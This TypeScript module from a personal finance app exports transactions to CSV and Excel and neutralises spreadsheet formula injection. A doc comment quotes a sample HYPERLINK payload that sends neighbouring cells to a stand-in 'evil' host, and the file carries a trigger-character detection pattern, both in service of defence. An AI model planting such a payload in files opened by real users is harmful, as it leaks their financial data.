import Papa from 'papaparse';
import ExcelJS from 'exceljs';
import { AccountRepository } from '../dexie/accountRepository';
import { CategoryRepository } from '../dexie/categoryRepository';
import { TransactionRepository } from '../dexie/transactionRepository';
import { MerchantRepository } from '../dexie/merchantRepository';
import { TagRepository, TransactionTagRepository } from '../dexie/tagRepository';
import { buildCategoryLabels } from '../../domain/categories/categoryHierarchy';

export interface ExportRow {
	// The first five columns are the original export, in their original order, so a file produced
	// before the later columns existed still lines up — and so does mapping this file back through
	// the importer by column name.
	date: string;
	account: string;
	categories: string;
	amount: string; // rupees, "-" separated by two decimals
	notes: string;
	/** 'income' | 'expense' | 'transfer'. Without it a transfer was two rows indistinguishable from
	 *  an uncategorized expense and an uncategorized income, and every card payment looked like
	 *  spending. */
	type: string;
	merchant: string;
	/** Tag names, "; "-separated. */
	tags: string;
	/** 'confirmed' or 'unreviewed' (still waiting in the Review Queue). */
	status: string;
	/** For a transfer: the account on its other side — "to" for the leg that left this account,
	 *  "from" for the one that arrived. Empty for everything else. */
	counterpart: string;
	/** For an entry the Android app captured from a message: when the phone received it, as an
	 *  ISO-8601 UTC timestamp. Empty for everything else. */
	captured_at: string;
	/** For a captured entry whose message states a time: when the payment says it happened (ISO-8601
	 *  UTC). Empty otherwise. */
	payment_at: string;
	/** 'debt', 'savings', 'investment' or 'bills' when the entry was marked as one; empty otherwise. */
	purpose: string;
}

/** Flattens the ledger into export-ready rows (FR-039): amounts in rupees, human-readable names. */
export async function buildExportRows(key: CryptoKey): Promise<ExportRow[]> {
	const [accounts, categories, merchants, tags, transactions] = await Promise.all([
		AccountRepository.list(key),
		CategoryRepository.list(key),
		MerchantRepository.list(key),
		TagRepository.list(key),
		TransactionRepository.search(key)
	]);
	const accountNameById = new Map(accounts.map((a) => [a.id, a.name]));
	const categoryNameById = buildCategoryLabels(categories);
	const merchantNameById = new Map(merchants.map((m) => [m.id, m.name]));
	const tagNameById = new Map(tags.map((t) => [t.id, t.name]));
	const transactionById = new Map(transactions.map((t) => [t.id, t]));

	// One grouped query for every split (and one for every tag), rather than one indexed query plus
	// one decrypt batch per transaction. At 20k transactions the old loop issued 20k round trips.
	const [splitsByTx, tagIdsByTx] = await Promise.all([
		TransactionRepository.splitsByTransaction(key),
		TransactionTagRepository.getTagIdsByTransaction()
	]);

	const rows: ExportRow[] = [];
	for (const tx of transactions) {
		const splits = splitsByTx.get(tx.id) ?? [];
		const categoryNames = splits.map((s) => categoryNameById.get(s.categoryId) ?? 'Uncategorized');
		const partner = tx.transferPairId ? transactionById.get(tx.transferPairId) : undefined;
		rows.push({
			date: tx.date,
			account: accountNameById.get(tx.accountId) ?? tx.accountId,
			// A transfer is not categorized spending; "Uncategorized" there was misleading noise.
			categories: tx.type === 'transfer' ? '' : [...new Set(categoryNames)].join('; '),
			amount: (tx.amount / 100).toFixed(2),
			notes: tx.notes ?? '',
			type: tx.type,
			merchant: tx.merchantId ? (merchantNameById.get(tx.merchantId) ?? '') : '',
			tags: (tagIdsByTx.get(tx.id) ?? [])
				.map((id) => tagNameById.get(id))
				.filter((name): name is string => Boolean(name))
				.join('; '),
			status: tx.reviewStatus,
			counterpart: partner ? (accountNameById.get(partner.accountId) ?? '') : '',
			captured_at: tx.capture ? new Date(tx.capture.receivedAt).toISOString() : '',
			payment_at:
				typeof tx.capture?.txnAt === 'number' ? new Date(tx.capture.txnAt).toISOString() : '',
			purpose: tx.purpose?.kind ?? ''
		});
	}
	return rows;
}

/**
 * Spreadsheet formula injection defence (CWE-1236). Notes, account names, and category names
 * are user-controlled text, and this file exists to be opened in Excel/LibreOffice/Sheets —
 * where a cell beginning `=`, `+`, `-`, `@`, or a control character is evaluated as a formula.
 * A note reading "Refund details" can be `=HYPERLINK("http://evil/?d="&A1,"Refund details")`,
 * which exfiltrates neighbouring cells when clicked.
 *
 * The realistic delivery is not self-attack: it is a hostile merchant description arriving
 * through CSV import, sitting in the ledger, and detonating when the user later exports and
 * opens the file — or forwards it to an accountant.
 *
 * A leading tab makes spreadsheets treat the cell as text; they strip it on display, so the
 * value still reads correctly.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

function neutralizeFormula(value: string): string {
	return FORMULA_TRIGGER.test(value) ? `\t${value}` : value;
}

/** `date`, `amount`, `type`, `status` and the two timestamps are generated, not user text, and `amount` legitimately
 *  starts with `-` — prefixing it would break numeric parsing in the spreadsheet. */
function sanitizeRow(row: ExportRow): ExportRow {
	return {
		...row,
		account: neutralizeFormula(row.account),
		categories: neutralizeFormula(row.categories),
		notes: neutralizeFormula(row.notes),
		merchant: neutralizeFormula(row.merchant),
		tags: neutralizeFormula(row.tags),
		counterpart: neutralizeFormula(row.counterpart)
	};
}

export function exportToCsvBlob(rows: ExportRow[]): Blob {
	const csv = Papa.unparse(rows.map(sanitizeRow));
	return new Blob([csv], { type: 'text/csv;charset=utf-8' });
}

export async function exportToXlsxBlob(rows: ExportRow[]): Promise<Blob> {
	const workbook = new ExcelJS.Workbook();
	const sheet = workbook.addWorksheet('Transactions');
	sheet.columns = [
		{ header: 'Date', key: 'date' },
		{ header: 'Account', key: 'account' },
		{ header: 'Categories', key: 'categories' },
		{ header: 'Amount', key: 'amount' },
		{ header: 'Notes', key: 'notes' },
		{ header: 'Type', key: 'type' },
		{ header: 'Merchant', key: 'merchant' },
		{ header: 'Tags', key: 'tags' },
		{ header: 'Status', key: 'status' },
		{ header: 'Transfer account', key: 'counterpart' },
		{ header: 'Captured at', key: 'captured_at' },
		{ header: 'Payment time', key: 'payment_at' },
		{ header: 'Purpose', key: 'purpose' }
	];
	sheet.addRows(rows.map(sanitizeRow));
	const buffer = await workbook.xlsx.writeBuffer();
	return new Blob([buffer], {
		type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
	});
}
